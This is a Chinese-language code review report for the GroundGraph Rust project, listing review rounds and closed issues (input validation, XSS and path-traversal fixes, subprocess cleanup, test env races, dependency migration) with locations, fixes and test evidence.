# GroundGraph 代码审查报告（活跃问题）

> **本文件汇总所有审查问题**：前半为活跃 #63–#270，后半为归档附录（已闭环 verdict + 原始记录 #1–#80）。第八批 #241–#270 为 2026-06-14 第十五轮审查新发现，**已于 2026-06-14 逐条核实 + TDD 处理完毕**（26 项修复 / 4 项核实为按设计·无害 / 2 项 🟠 待专项；详见第八批小节的"本批处理结论"表）。
>
> **去重说明**：归档附录的第三批段落仅保留 7 个已闭环条目（#61/#62/#64/#67/#71/#73/#76），13 个活跃条目（#63/#65–#80）已与文件前半合并，不重复。
>
> **审查方法**：7 轮并行 agent 审查（每轮 3-5 个 agent 按模块/角度分工）+ 主审查交叉去重。详见 [CLAUDE.md](CLAUDE.md) 的"代码审查工作流"章节。
>
> **严重度分级**：**High**（生产可触发，影响数据/安全）、**Medium**（边界/性能/设计缺陷）、**Low**（微优化/潜在隐患）

## 总览

| 批次 | 编号范围 | 活跃数 | 来源文件（已合并） |
|---|---|---|---|
| 第三+四批 | #63–#130 | 11 | 原 issues2.md；第十三轮（Wave A/B）正确性·安全·子进程闭环 14 项 |
| 第五批 | #131–#180 | 11 | 原 issues3.md；第十四轮（Wave C/D）store schema·死列·性能微优闭环 |
| 第六批 | #181–#210 | 3 | 原 issues4.md；第十四轮·Wave E 闭环 #72/#206/#209/#210 + Wave C #202 |
| 第七批 | #211–#240 | 17 | 第十四轮·Wave E 闭环 #215/#216/#227 |
| 第八批 | #241–#270 | 30 | 第十五轮审查新发现（High 1 / Medium 9 / Med-Low 4 / Low 10 / Nit 6），**已处理**：26 修复 / 4 按设计·无害 / 2 🟠 待专项 |
| **活跃合计** | **#63–#270** | **72→0** | **2026-07-17/18 v0.3.0 发布清零专项**：42 项 🟠 待专项全部闭环（#223 为部分闭环·残余上游阻塞由 cargo-deny 持续监控）；另闭环 4 项 RUSTSEC（无 issue 编号）。剩余未闭环仅 #82（待 Apple Developer ID 证书，非代码） |

> **2026-07-17/18 v0.3.0 发布清零专项（42 项 🟠 待专项全清，TDD，claude code 执行 + 逐阶段人工验收）** — 按主题分 14 个专项阶段推进，每阶段 fmt/clippy `-D warnings`/全量测试门禁全绿后进入下一阶段：
> **路径/封装**：#145/#242/#263（22 份路径解析副本收敛 `confine_under_root`）、#168（`Confidence` newtype 根治 #63 构造侧 + `Node::validate` 写入边界）。
> **store/schema**：#151/#152/#188/#190（迁移 005 删死列死表）、#205（边身份=kind+source+from+to + certainty 防降级）、#137（孤儿清理 N×→1×sweep）、#213（rusqlite 0.40）。
> **engine/解析**：#166（`EngineError` 66 公共入口）、#130（12 adapter 收集骨架）、#123（RustMacro）、#125（C# LINQ/partial）、#238（六语言 fixture）、#143/#144/#156/#158/#160/#162（bench 驱动微优，search -16%~-44%）、#217（子进程退避重试）。
> **CLI/UX**：#233/#115/#232（退出码契约 0/2/70）、#113（completions）、#116（doctor）、#128（help 分组+示例）、#127/#230/#231/#234（tracing/进度条/env 注册表）。
> **供应链/测试**：#211（tree-sitter-dart 精确钉死）、#224/#225/#226（策略入档+阻塞注明）、#229（protobuf→prost 字节级兼容）、#236/#221/#239（脚手架共享/覆盖棘轮/命名规范）；webui #175（i18n）。
> **明确不做**（verdict 已判）：#109（MCP 并发，按设计留架构专项）、#161（N 极小不改）、#228（保持现状）。**#82** 仅剩 Apple 证书运营操作，流水线 secrets 接口已留好。
> 验证：全 workspace 1489+ 测试全绿、clippy 零告警、`cargo deny check` 四项全 ok 零豁免、search criterion 基准可复跑。

**已归档**（见 [issues-archive.md](issues-archive.md)）：第一批 #1–#30、第二批 #31–#60、#61–#180 中已闭环 43 项。

> **2026-06-13 第八轮处理（9 项闭环，全部 TDD 修复）** — 聚焦第六批 panic-safety / 安全 / 依赖：
> **#181**（git_diff u32 溢出 panic→`checked_add`）、**#182**（port_coverage `unwrap`→`let-else`）、**#183**（webui `node.kind` XSS→`esc()`）、**#184**（`time` CVE→0.3.47）、**#194**（MCP `search_graph` `expect`→`bail!`）、**#195**（MCP `context_pack` `expect`→`bail!`）、**#196**（`scip_runner` stderr `expect`→`io::Error`）、**#197**（`dart_sidecar` argv 解析→`shlex`）、**#208**（`NodeKind::language()` 全枚举 round-trip 测试）。
> 每项标题下含 `✅ 已闭环` verdict。验证：`cargo clippy --workspace --all-targets -- -D warnings` 0 警告；新增/受影响单测全绿。

> **2026-06-13 第九轮处理（核心算法/存储/安全，50 项判定，23 闭环 + 27 已判定待专项）** — 中立核实后逐项处理：
>
> **✅ 修复 11（多数 TDD）**：**#96**（graph_equiv 列匹配改用去重归一化集合）、**#119**（questions 孤儿判定补 `DeclaresImplementation` 入边，TDD）、**#124**（resolve_heuristic_refs 先去重再截断 `MAX_REF_TARGETS`）、**#153**（迁移 forward-compat 守卫 `SchemaTooNew`，TDD）、**#218**（commit_bulk COMMIT 失败仍恢复 `wal_autocheckpoint`）、**#186**（read_to_string OOM 门：lsp_indexer 2 处新加 + docs/treesitter 已有 = 4 处齐全，并顺带加固 schema_indexer 单文件循环）、**#199**（connect `links.path` 路径穿越→`confine_manifest_path` 拒绝绝对/`..`，TDD）、**#203**（slugify 含非 ASCII 时附加内容 hash 防碰撞，TDD）、**#191**（explain_symbol `as_array_mut().expect`→`if let Value::Array`）、**#189**（docs_indexer 补 `source_file`）、**#204**（innermost_containing 过滤 `start_line>0` 防外部表误归属）。
>
> **🟡 误报/按设计 12（闭环，不改）**：**#93**（route_coverage suffix=1 为有意 opt-in，仅加 doc Warning）、**#94**（dead_island 的 `Low`=「是死代码的置信度低」语义正确，reason 已区分）、**#117**（`break` 后 `stack.remove` 仍执行，误报）、**#118**（`max_sites_per_entry:0` 反而清空 sites；occurrences 重写是 scoped 正确语义）、**#163**（`connection()` 是有意只读访问器）、**#165**（`{0}`+`#[source]` 为 thiserror 标准权衡，内联 detail 被 decode 诊断依赖）、**#179/#207**（每次 open 重建索引是有意自愈，已 doc）、**#192**（外层 match 无 `_`，新 variant 是编译错误而非静默丢弃；建议的 `_=>` 反而削弱检查）、**#193**（Web 提前 return 因其绕过 build_graph_view，`unreachable!` 已注明）、**#200**（cwd 副作用是已知权衡，release_scan 走 scratch）、**#201**（当前 ArtifactId 字符集 POSIX 安全）。
>
> **🟠 已判定·待专项 27（验证属实，需独立 PR / 迁移 / bench，未在散修轮处理）**：解析器 #123/#125；存储 schema/迁移 #137/#139/#140/#145/#151/#152/#154/#158/#188/#190/#202/#205；engine 性能微优 #142/#143/#144/#156/#159/#160/#161/#162/#178；panic 防御 #206；MCP 健壮 #209/#210；信任模型 #187。
> 验证：`cargo clippy --workspace --all-targets -- -D warnings` 0 警告；新增/受影响单测全绿（artifact_id/questions/connect/migrations/store/scip_overlay/docs_indexer）。

> **2026-06-13 第十轮处理（MCP 协议面 10 项，全部闭环：修复 7 + 按设计 3）** — 聚焦 `groundgraph-mcp` 的协议契约与健壮性：
>
> **✅ 修复 7（全部 TDD）**：**#89**（dispatcher 新增 `tools/validate.rs` 手写 JSON-Schema 子集校验：additionalProperties/required/type/enum/minimum/items，违约 -32602，不再静默丢字段）、**#86**（`tools/list` 加 MCP `cursor`/`nextCursor` 分页 `paginate_tools`+`TOOLS_PAGE_SIZE`，非法 cursor -32602；拒绝"描述截断"子建议）、**#104**（initialize 按 `SUPPORTED_PROTOCOL_VERSIONS` 协商 protocolVersion，回显/回退，clientInfo 记 stderr）、**#87**（explain_symbol `MAX_EXPLAIN_EDGES=500`+`truncated`）、**#88**（context_pack `SNIPPET_MAX_FILE_BYTES=2MB`+`MAX_PACK_NEIGHBORS=300`+`truncated`）、**#107**（pump `read_line_capped`+`MAX_LINE_BYTES=16MB` 防大行 OOM）、**#108**（resolve_repo_root→Result：空串报错、相对路径禁 `..`）。
>
> **🟡🟠 按设计 3（闭环，不改）**：**#105**（无状态 dispatcher 是有意设计，被 3 个现有测试固化；强制握手门破坏既定契约、本地单客户端几无收益）、**#106**（不声明未实现能力才正确；-32601 是规范响应；MCP 取消是 `notifications/cancelled` 已静默不回；`$/cancelRequest` 属 LSP）、**#109**（顺序 stdio 分发是 MCP 本地常规模式；线程池+取消属大改，强行超时丢弃持 SQLite 连接线程不安全，留并发专项）。
>
> 每项标题下含 verdict。验证：`cargo clippy -p groundgraph-mcp --all-targets -- -D warnings` 0 警告；`cargo test -p groundgraph-mcp` 31 单测 + 9 集成全绿。

> **2026-06-13 第十轮处理·续（CLI UX/一致性 14 项：闭环 5 + 已判定·待专项 9）** — 聚焦 `groundgraph-cli` 的参数契约与一致性：
>
> **✅ 修复 4（全部 TDD，parse 级/集成）**：**#91**（`--output`→`--out` 统一 + `output` 隐藏别名）、**#112**（select-tests 默认 base 统一为 `origin/main`）、**#114**（5 个位置参数加 `non_empty_value` 校验，空串 exit 2）、**#111**（graph/search/impact/dashboard 文件写入状态行 `println!`→`eprintln!`，stdout 只承载数据）。
>
> **🟢 不成立 1**：**#110**（"缺 groundgraph init 提示"已被 20+ runner 的 `no GroundGraph workspace... run \`groundgraph init\`` 守卫覆盖，多测试固化，issue 陈旧）。
>
> **🟠 已判定·待专项 9（验证属实，属功能增量/跨切面重构，非散修）**：#113（completions 子命令）、#115（`--format` ValueEnum 化，与 #233 退出码耦合）、#116（doctor 命令）、#127（tracing 日志框架）、#128（help 分组/示例）、#231（index 进度反馈）、#232（部分失败退出码，需 IndexResult 改造）、#233（typed 退出码契约）、#234（环境变量注册表/文档）。
>
> 验证：`cargo clippy -p groundgraph-cli --all-targets -- -D warnings` 0 警告；`cargo test -p groundgraph-cli --bin groundgraph` 66 单测全绿 + `graph` 集成（含 #111 stdout 洁净断言，改回 `println!` RED 已验证）。

> **2026-06-13 第十一轮处理（release/CI/供应链 20 项：闭环 9 + 已判定·待专项 11）** — 覆盖发布脚本安全、CI 矩阵/供应链扫描、LSP stderr、依赖卫生：
>
> **✅ 修复 9**：**#214**（LSP stderr `inherit`→`piped`+drainer+`captured_stderr`，折叠进 skip_reason；TDD 3 测）、**#80**（tar 穿越守卫 + sha256 basename + `strip="debuginfo"`）、**#81**（rsync 密钥排除 + 兜底清扫）、**#83**（NAME/SRC slug 守卫）、**#85+#185**（python argv 传参，消除注入）、**#101**（CI macOS matrix）、**#102**（cargo-deny + deny.toml + npm audit + `--locked`）、**#227**（clap 去 color 栈：anstream/colorchoice/utf8parse 等已移除）。
>
> **🟠 判定·待专项 10 + 🟡 1**：**#82**（macOS 签名/公证，需 Apple Developer ID 基建）、**#211**（tree-sitter-dart pin，Cargo.lock 已锁）、**#212**（unsafe-libyaml，并入 #70）、**#213**（rusqlite 升级专项）、**#223/#224/#225**（重复传递版本，由 #102 cargo-deny 持续监控）、**#226**（宽版本号，已被 Cargo.lock + `--locked` 缓解）、**#229**（scip→prost 重写专项）、**#228**（workspace.deps 集中化，单 crate 独占·低收益）、**#240**（clap minor 不对齐·吹毛求疵，Cargo.lock 已锁）。
>
> 验证（真实命令）：shell 加固经构造 `../f` 恶意归档/含密钥目标仓/含单引号路径实测；`cargo deny check` → advisories/licenses/sources ok（0.19.8）；`cargo build --workspace --locked` 通过；engine clippy 0 警告；lsp_* 43 单测绿；`cargo tree` 确认 color 栈移除。

> **2026-06-13 第十二轮处理（webui 加固 / 文档同步 / 测试基建 30 项：闭环 18 + 不成立 1 + 按设计·缓解 2 + 待专项 9）** — 收尾第五~七批剩余条目：
>
> **✅ webui 加固 7（核心 JS 逻辑 node 实测，export 契约 graph 5 单测 + 19 集成守护）**：**#100**（`sameOriginData` 拒绝 `?data=` 绝对/协议相对/各 scheme，13 组实测）、**#170**（vendor `<script>` 移到 `</body>` 前，VENDOR_TAG 原样保留）、**#171**（`visibilitychange` 暂停 `pauseAnimation` + 可恢复 trackFps）、**#172**（CSP meta：`connect-src 'self'` 封 SSRF，`'unsafe-eval'` 为 d3 `new Function` 必需，allowlist 精确）、**#173**（`webglAvailable` 探测 + `webglcontextlost` 防黑屏）、**#174**（关闭键 `<button>`+aria、图例/邻居 `role+tabindex`+键盘、`:focus-visible`、Esc）、**#176**（description/OG/twitter/theme-color/SVG favicon）。
>
> **✅ 文档同步 5 + 🟡 缓解 1**：**#99**（skills 单一真相源：release cp `skills/groundgraph`，删 `packaging/skills`）、**#132**（README 52s→28s 对齐白皮书）、**#133**（`packaging/macos/README.md` LSP→SCIP 矩阵重写）、**#146**（PRD Phase 6 标注已落地）、**#177**（README 补 MCP over stdio）；🟡 **#180**（build.sh 已固定版本 + gitignore 注释，漂移已缓解）。
>
> **✅ 测试/存储/核心 5 + 🟡 1 + 🟢 1**（多数前轮 TDD，本轮补 verdict）：**#167**（SliceOptions Default repo_root→"."）、**#198**（apply_review `File::lock` 防 lost update）、**#219**（10 CLI 命令 e2e）、**#220**（Dart scanner proptest）、**#222**（4 MCP 工具 tools/call round-trip）、**#235**（migrations apply_list 回滚/部分/索引）；🟡 **#169**（`Store: Send + !Sync` 已由类型系统强制，补 doc + 编译期 Send 断言）；🟢 **#237**（SQLite NUL 无损 roundtrip 实测，不成立）。
>
> **🟠 已判定·待专项 9**：**#166**（engine typed-error 重构）、**#168**（core 字段封装/校验 setter）、**#175**（webui i18n）、**#217**（子进程重试）、**#221**（src 单测基建）、**#230**（tracing，并入 #127）、**#236**（Dart golden test DRY）、**#238**（6 门语言 fixture）、**#239**（测试命名统一·吹毛求疵）。
>
> 每项标题下含 verdict。验证：node 抽 `sameOriginData` 13 组实测 + 内联脚本 `vm.Script` 语法检查；`cargo test -p groundgraph-cli graph`（5 单测 + 19 集成）守护 export 内联契约；`cargo check -p groundgraph-store` 通过（`Store: Send` 断言）；`bash -n` release 脚本 OK。

> **2026-06-13 第十三轮处理（正确性·安全·子进程健壮性 14 项，全部 TDD 闭环）** — 重审前几轮判定为「待专项」的高价值项，确认可安全散修：
>
> **✅ 修复 11（TDD）**：**#63**（数据完整性）、**#65**、**#66**、**#68**（资源泄漏）、**#69**、**#77**、**#78**、**#79**、**#103**、**#126**（子进程健壮性：超时/僵死/退出码/stderr 收口）、**#187**（信任模型：配置注入的 `*_command` 须经 `GROUNDGRAPH_TRUST_CONFIG_COMMANDS=1` 显式放行，默认忽略并回退内置默认）。
>
> **🟡 按设计 3**：**#74**、**#139**、**#154**（核实后属有意权衡/语义正确，仅补 doc 与 verdict）。
>
> 验证：受影响 crate `cargo clippy --all-targets -- -D warnings` 0 警告；新增/受影响单测全绿。

> **2026-06-13 第十四轮处理（store schema·死列 / 性能微优 / MCP·杂项，Wave C/D/E）** — 收尾剩余可散修项，其余确认需独立 PR：
>
> **Wave C（store schema/死列）✅ 4**：**#75**（`overlay` 列）、**#140**、**#178**、**#202**；🟠 待专项 5：#151/#152/#188/#190/#205（schema 迁移/列治理，需独立迁移 PR）。
>
> **Wave D（engine 性能微优）✅ 2 + 🟡 3**：**#142**、**#159** TDD 闭环；**#144/#156/#161** 核实按设计；🟠 待专项 6：#130/#137/#143/#158/#160/#162（需 bench 支撑的微优，非散修）。
>
> **Wave E（MCP/杂项）✅ 7**：**#209**（出站 JSON `MAX_TOOL_RESULT_BYTES`=1 MiB 上限）、**#210**（错误响应 `redact_paths` 抹仓根/家目录）、**#215**（`StoreError` 按 SQLite result code 分类 Busy/Corrupt/ReadOnly/DiskFull + `is_retryable`）、**#216**（迁移竞态：`BEGIN IMMEDIATE` + 事务内 `version_applied` 复核，非新增文件锁）、**#72**（`.groundgraph.yaml` `schema_version` 前置告警，对齐 DB `SchemaTooNew`）、**#227**（`clap` 去 color 栈实证）、**#206**（8 处守卫式 unwrap 防御性加固：远守卫 4 处消除 panic、近守卫 3 处 `.expect` 文档化不变量）。
>
> 验证（真实命令）：`cargo clippy --workspace --all-targets -- -D warnings` 0 警告；各 crate 针对测试 TDD 红→绿（含 `concurrent_apply_all_on_a_fresh_db_does_not_conflict` 6 线程×40 轮复现迁移竞态、`sqlite_errors_classify_by_result_code`、`ok_json_refuses_payloads_over_the_size_cap`、`redact_paths_*`、`config_schema_*`、`is_ident_handles_degenerate_inputs` 等）；末尾 `cargo test --workspace --locked` 全绿。

> **2026-06-15 第十六轮处理（产品可用性 dogfood：8 项 TDD 闭环，born-closed #271–#278）** — 发布前以真实 CLI 在样例仓上逐命令试用（index/search/impact/context/graph/constants/contract/select-tests…），发现并当轮 TDD 修复 8 处可用性/正确性缺陷。**均 born-closed**（发现即闭环，不进活跃列表，编号仅供引用，活跃区间仍 #63–#270）：
>
> **✅ CLI 输出一致性 2**：**#271**（`context` human 输出把同文件多符号显示成重复路径行 → `render_human`/`item_line` 改 `name (path)`，去歧义）、**#272**（`impact` 的 Linked tests 同样的重复行 → `render_human`/`impact_item_line` 改 `name (path)`）。
>
> **✅ 抽取正确性 1**：**#273**（`constants`/字面量抽取把 Python docstring 当魔法常量 → `constants.rs` 新增启发式 `opens_docstring`，`scan_literals` 跳过 def/class 签名后或扫描跨度起始的三引号串，去噪）。
>
> **✅ CLI 参数对齐 1**：**#274**（`select-tests` 缺 `--worktree`，与 `impact` 不对齐、无法对未提交改动选测 → `main.rs` 加 `--worktree`，置空 `head_ref` 走工作区 diff）。
>
> **✅ 静默失败提示 1**：**#275**（`graph --focus` 传无效 id 静默产出空图 → `graph.rs` 新增 `focus_miss_warning`，空视图时 stderr 提示期望的 id 形态）。
>
> **✅ 防盲区 / 覆盖自检 1**：**#276**（config 写于单语言期、后续新增语言被静默漏索引 → engine 新增 `unindexed_present_languages`（复用 `init` 的选举阈值 ≥3 文件/25%/manifest，正确处理 dart sidecar 不误报），CLI `index` 非 docs-only 时对"有源文件但未索引"的语言 stderr 提示）。
>
> **✅ 数据契约挖掘补全 1**：**#277**（`contract` 序列化键映射只认 `obj["key"]` 下标、漏 Python/JS/Java 惯用的 `obj.get("key"[, default])` → `data_contract.rs` 新增 `scan_get_call_keys`，paren 深度正确解析默认值实参，并入同一 keymap 聚合）。
>
> **✅ 可解释性 1**：**#278**（`search` 的"分词"只显示整标识符 token，隐藏了内容层 FTS 对 camelCase 的子词拆分，用户看不懂为何 `totalCents` 命中含 `total`/`cents` 的正文 → CLI `content_token_line`，仅当子 token 多于结构 token 时增显"内容层分词"行；纯展示，不改匹配语义）。
>
> 验证（真实命令，全量门禁绿）：`cargo fmt --all -- --check` 干净；`cargo clippy --workspace --all-targets -- -D warnings` 0 警告；`cargo test --workspace --no-fail-fast` 退出 0、**1303 测试通过 / 0 失败**（含本轮 8 个新 TDD 测试：`unindexed_languages_*`、`scans_python_get_call_keys_with_defaults`、`get_call_ignores_non_string_*`、`content_token_line_*` 等，红→绿已验证）。

> **2026-06-15 第十七轮处理（公开发布前·发布链 3 项硬阻断收口）** — 用户确认"准备公开发布"，本轮收口三项发布前残留：供应链废弃依赖（#70/#212）、FTS 性能（#138）、macOS Gatekeeper 准入（#82）。
>
> **✅ 供应链·废弃依赖迁移 2（#70 + #212）**：把全工作区 `serde_yaml 0.9.34+deprecated` → 维护中的 `serde_yml 0.0.13`（后端 `noyalib`，不再传递引入名为 `unsafe-libyaml` 的纯 C crate）。根 `Cargo.toml` 改 `serde_yml = "0.0.13"`，`groundgraph-engine`/`groundgraph-mcp` 改 `{ workspace = true }`；~30 个 `.rs` 源文件 + 测试逐处 `serde_yaml::` → `serde_yml::`（API 同签名 drop-in）；`Cargo.lock` 重解析后 `serde_yaml`/`unsafe-libyaml` 条目**彻底消失**，新增 `serde_yml`/`noyalib`。`deny.toml` 注释同步更新（无 advisory 被 ignore）。**#212 随 #70 一并闭环**——`unsafe_code = "forbid"` 的工作区不再有名为 unsafe-* 的传递依赖。AI 生成的 `candidates.yaml`（真实外部输入面）现由维护中的解析器处理。
>
> **✅ FTS 性能（#138）复验闭环**：本轮复查确认 `repositories.rs::rebuild_fulltext` 已在写事务内执行 `INSERT INTO node_fts(node_fts) VALUES('optimize')`，回归测试 `repeated_fulltext_rebuilds_stay_queryable_after_optimize`（连续 8 次重建仍正确）存在且绿——多次 `index` 后 BM25 不再因段累积退化。无需新改动。
>
> **🟢 macOS 签名/公证脚本框架就位·待证书（#82）**：`scripts/release_macos_universal.sh` 在 `lipo` 通用二进制后增加可选的 `codesign`（Developer ID Application + `--options runtime` 加固运行时 + `--timestamp`）→ `notarytool submit --wait`（zip 后提交公证）→ `spctl --assess` 验证 三段流水线，全部由环境变量 `GROUNDGRAPH_SIGN_IDENTITY` + `GROUNDGRAPH_NOTARY_PROFILE` 门控：未设时跳过并打印明确告警（保持 ad-hoc，不静默发布未签名包），设了即走完整签名+公证。**仓内无法自验**（依赖用户的 Apple Developer ID 证书/keychain profile）——框架已就位，发布者填证书即可消除 Gatekeeper 拦截。降级为"待证书"，非代码阻断。
>
> 验证（真实命令，全量门禁绿）：`cargo check --workspace --all-targets` 退出 0（`serde_yml` 编译通过）；`cargo fmt --all -- --check` 干净；`cargo clippy --workspace --all-targets -- -D warnings` 0 警告；`cargo test --workspace` 退出 0、**61 个测试套件全绿 / 0 失败**（迁移后逐序列化点回归：`config_schema`/`check_doc_drift`/`checks_and_context` 等 YAML 往返用例全通过）。

---

## 活跃条目（#63–#240）

### 63. `EdgeAssertion.confidence: f32` 写入无 clamp，store 层接受 NaN/Inf/负值/大于 1；`edge_from_row` 把 NaN 当合法值解码

> **✅ 已闭环（2026-06-13 第十三轮，TDD）** — 成立（数据完整性），但"`partial_cmp` 排序 panic"**当前未触发**：全仓无对 edge `confidence` 的 `partial_cmp`/`sort_by`（仅 route/port_coverage 对有限 `coverage` 比率排序）。仍按防御纵深修复：新增 `groundgraph_core::sanitize_confidence(f32)`（`NaN→1.0`、`±∞`/越界由 `clamp(0,1)` 折叠，输出恒为 `[0,1]` 有限值），并在 store **写入两处**（`upsert_edge` + `upsert_edges_bulk`）与**读出**（`edge_from_row`）三处统一过滤，旧库/外部工具写入的坏值也无法到达下游比较器；另加 `EdgeAssertion::with_confidence` 净化构造器 + 字段 doc 不变量。验证：core `sanitize_confidence_clamps_*`/`with_confidence_*` + store `upsert_edge_sanitises_out_of_range_and_nan_confidence`（NaN/±∞/-0.25/2.5/0.42，单写+bulk 双路）全绿。

- **位置**：`crates/groundgraph-core/src/edge.rs:180`（`pub confidence: f32`）；`crates/groundgraph-store/src/repositories.rs:221` + `248`（写入）+ `651-654`（读出）；`crates/groundgraph-store/src/migrations_sql/001_initial.sql:29`（`confidence REAL NOT NULL` 无 CHECK）
- **问题**：(1) `EdgeAssertion` 工厂 `declared/fact` 硬编码 1.0，但 `EdgeAssertion` 是公开 struct，调用方可构造 `confidence: f32::NAN` / `f32::INFINITY` / `-0.5` / `1e30`。(2) `upsert_edge`/`upsert_edges_bulk` 直接 `edge.confidence as f64` 写入 SQLite REAL，SQLite 不校验范围。(3) `edge_from_row` 把 `row.get::<_, f64>(7)? as f32` 直接转回——NaN 在 SQLite 中可以往返，消费方比较 `confidence > 0.5` 时 NaN 返回 false，但 `confidence.partial_cmp` 在排序时 panic 或得到不稳定顺序。(4) 商业候选 `BusinessCandidate.confidence: Option<f32>` 也无校验，YAML 中 `confidence: 1.5` 会被静默接受（`graph.rs:783` 处的 `.clamp(0.0, 1.0)` 只在 graph view 层兜底，store 层无保护）。
- **触发场景**：人工编辑 candidates.yaml 写 `confidence: 2.0`；未来某个 AI 写入路径误传 NaN；DB 被外部工具写入非法 REAL 值。
- **建议**：(a) `EdgeAssertion` 增加 `with_confidence` 构造器做 `clamp(0.0, 1.0)` + `is_finite` 检查；(b) `upsert_edge`/`upsert_edges_bulk` 写入前断言 `edge.confidence.is_finite() && (0.0..=1.0).contains(&edge.confidence)`；(c) `edge_from_row` 读出时如果 NaN/越界，记录 decode_error；(d) schema 加 `CHECK (confidence BETWEEN 0.0 AND 1.0)`。

### 65. 5 个 golden 测试文件的 `EnvGuard` 缺少 `ENV_LOCK`，多线程下 `set_var`/`remove_var` 数据竞争（UB）

> **✅ 已闭环（2026-06-13 第十三轮）** — 成立（同一二进制内并行 test 线程对进程级 env 的 `set_var`/`remove_var` 竞争；env 是 per-process，故跨二进制不竞争）。采用比 `ENV_LOCK` 更彻底的设计：抽出共享 `tests/common/mod.rs`，用 `Once` **每进程只设一次** `GROUNDGRAPH_DART_ANALYZER(_BIN)`、**永不 remove**（每个 golden test 都要同一份 sidecar env，根本不需要 per-test set/restore）——无 remove、无交错、无竞争，且 set-once 后 `call_once` 保证读前已写。5 文件（p4/p5/p7/p8/p9）删除各自 `EnvGuard`/`Drop`，改调 `common::enable_dart_sidecar_env`。验证：本机 Dart 存在，`p5`(5)/`p9`(4) 等 golden 全绿；engine/core/store `clippy --all-targets -D warnings` 0 警告。

- **位置**：`crates/groundgraph-engine/tests/p4_pixcraft_golden.rs:89-115`、`p5_search_golden.rs:74-100`、`p7_dead_code_golden.rs:70-96`、`p8_semantic_edges.rs:77-103`、`p9_business_candidates.rs:68-94`
- **问题**：5 个 golden 测试各自定义 `EnvGuard`，通过 `std::env::set_var`/`remove_var` 修改 `GROUNDGRAPH_DART_ANALYZER` 与 `GROUNDGRAPH_DART_ANALYZER_BIN`，**但都没有 `ENV_LOCK`**。对照 `dart_sidecar_acceptance.rs:239` 的 `static ENV_LOCK: std::sync::Mutex<()>` 显式注释 "Process-wide env mutations race between parallel tests"——那个文件加锁，这 5 个文件没有。`cargo test` 默认多线程并行：p4/p5/p7 同时跑时，一个 test 在 `Drop` 里 `remove_var`，另一个正在 `std::env::var` 读，会产生 UB（Rust 1.81+ 起 `set_var` 被短暂标记 unsafe 正是这个原因）。即便编译通过，运行时仍可能让 sidecar 错误启用/禁用、`Drop` 顺序不确定导致环境变量错乱、偶发 CI 失败难复现。
- **触发场景**：`cargo test --workspace` 默认并行执行测试。
- **建议**：把 5 个文件的 `EnvGuard` 替换为共享 helper（提取到 `tests/common/`），在 helper 内统一加 `ENV_LOCK`，每个 test body 第一行 `let _serial = env_lock();`。

### 66. P4/P5/P7/P8/P9 Dart golden 测试在无 Dart SDK 的 CI 上 silent-pass

> **✅ 已闭环（2026-06-13 第十三轮，实测两分支）** — 成立。统一经 `common::dart_golden_ready(available, ctx)` 门控：(a) sidecar 不可用且 `GROUNDGRAPH_GOLDEN_REQUIRED` 已设 → `panic!` 硬失败（CI 可强制）；(b) 否则把 skip 打到 **stdout**（`cargo test` 默认可见，不再藏在 stderr）后 `return`。5 文件 `eprintln!`+`return` 全部替换。**真实二进制实测**（临时 `PATH=/usr/bin:/bin` 隐藏 dart）：A) `GROUNDGRAPH_GOLDEN_REQUIRED=1` → `panicked at common/mod.rs:49 ... cannot run` + `test result: FAILED`（exit 101）；B) 不设 → stdout 打印 `skipping ... set GROUNDGRAPH_GOLDEN_REQUIRED=1 to enforce` + `test result: ok`。建议的 `#[ignore]` 未采用：会让默认 `cargo test` 完全不跑 golden，反而更隐蔽；门控 + 可选强制更优。

- **位置**：`crates/groundgraph-engine/tests/p4_pixcraft_golden.rs:117-134`（`setup_indexed_repo`）、`p5_search_golden.rs:102-139`、`p7_dead_code_golden.rs:98-134`、`p8_semantic_edges.rs:108-`、`p9_business_candidates.rs:`
- **问题**：每个 golden test 入口是 `let Some((tmp, _on, _bin)) = setup_indexed_repo() else { return; };`，而 `setup_indexed_repo` 在 `dart` 二进制缺失或 sidecar 源码缺失时返回 `None`。**测试直接 `return;` 通过**——既不 fail，也不 `#[ignore]`，不在测试摘要里标记 skipped。后果：CI 上没装 Dart SDK（Dart SDK 在 GitHub Actions 默认镜像里不存在）时，**整个 P4/P5/P7/P8/P9 golden 回归网完全失效但全部显示绿色通过**。如果 sidecar 解析逻辑回归（如 `dart_analyzer` 输出格式变了），CI 不会变红。`eprintln!("skipping: dart sidecar unavailable")` 走到 stderr，但默认 `cargo test` 不显示 stderr。
- **触发场景**：所有未显式安装 Dart SDK 的 CI。
- **建议**：(a) 改为 `#[ignore = "requires dart SDK; run with --include-ignored"]`；(b) 或在 CI 设 `GROUNDGRAPH_GOLDEN_REQUIRED=1`，测试检测到该变量但 dart 缺失时 `panic!`；(c) 至少把 skip 提到 stdout 而非 stderr。

### 68. 所有 sidecar / LSP / SCIP 子进程均未设置独立进程组，孙子进程 kill 后变孤儿

> **✅ 已闭环（2026-06-13 第十三轮，TDD）** — 成立（资源泄漏）。新增 `crates/groundgraph-engine/src/proc.rs` 统一子进程生命周期：spawn 时 `detach_process_group`（unix `process_group(0)`，非 unix no-op），teardown 用 `kill_tree`（unix 经 POSIX `kill -KILL -<pgid>` 杀**整个进程组**，再 `child.kill()` 兜底）。因 workspace `unsafe_code = "forbid"`，走 `kill` 二进制而非 `libc` FFI——**零新依赖、零 unsafe**，且 `kill` 不可用时优雅降级为单 PID kill。已接入全部四处 spawn：`lsp_client::spawn`、`dart_sidecar`、`lsp_probe`、`scip_runner`。TDD：`proc::kill_tree_reaps_an_orphaned_grandchild`（shell 后台 `sleep 60` 孙子 → 组杀后用 `kill -0` 判定其确已消失；旧的单 PID kill 会留孤儿）+ `reap_within_*`。

- **位置**：`crates/groundgraph-engine/src/lsp_client.rs:192-198`（LSP spawn）、`dart_sidecar.rs:138-149`（Dart sidecar spawn）、`scip_runner.rs:553-555`（SCIP indexer spawn）、`lsp_probe.rs:95-101`（probe spawn）
- **问题**：四处 `Command::spawn()` 均未调用 `process_group(0)`（unix）或对应 Windows API。当 Dart sidecar 运行 `dart run tool/.../groundgraph_dart_analyzer.dart` 时，`dart` 进程通常会再 fork 出 `dart_preprocessor`、`analysis_server` 或 Flutter tools 子进程。`child.kill()` 只对**直接子进程**发送 SIGKILL；孙子进程仍归属原进程组，在父进程退出后被 init 收养，**继续消耗 CPU/内存/持有 SDK 锁**。`lsp_client.rs` 的 `force_kill` 和 `Drop` 都只 kill 一个 PID；`dart_sidecar.rs:200-201` 的 `child.kill()` 同理。
